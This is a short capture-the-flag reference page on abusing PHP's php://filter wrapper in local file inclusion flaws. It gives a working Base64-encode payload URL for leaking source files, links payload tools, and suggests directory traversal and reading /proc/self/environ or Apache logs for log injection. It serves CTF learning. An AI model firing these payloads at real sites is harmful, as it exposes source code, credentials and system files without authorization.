---
title: "php://filter"
description: "Abuse PHP stream filters inside LFI vulnerabilities to exfiltrate Base64-encoded file content or include arbitrary data."
date: 2025-10-06
draft: false
categories: ["Web"]
tags: ["lfi", "php", "php filter", "file inclusion"]
authors: ["CTF.Support Team"]
summary: "Use PHP's stream filter wrapper to retrieve restricted source files through LFI exploitation."
aliases: ["/web/lfi/php-filter/"]
slug: "php-filter"
toc: true
---

## Example Usage

To return a Base64-encoded file (such as source code):

```text
view.php?page=php://filter/convert.base64-encode/resource=index.php
```

This reveals otherwise inaccessible PHP source code when decoded.

## Tools

| Tool                                                                                      | Purpose                           |
|-------------------------------------------------------------------------------------------|-----------------------------------|
| [PHP Include to Shell Char Dict](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT) | Generate payloads for LFI filters |
| [BurpSuite Repeater](https://portswigger.net/burp)                                        | Test file paths interactively     |

## Tips

- Combine with directory traversal (`../../`) to reach deeper targets.
- Look for `/proc/self/environ` or `/var/log/apache2/access.log` for potential log injection.
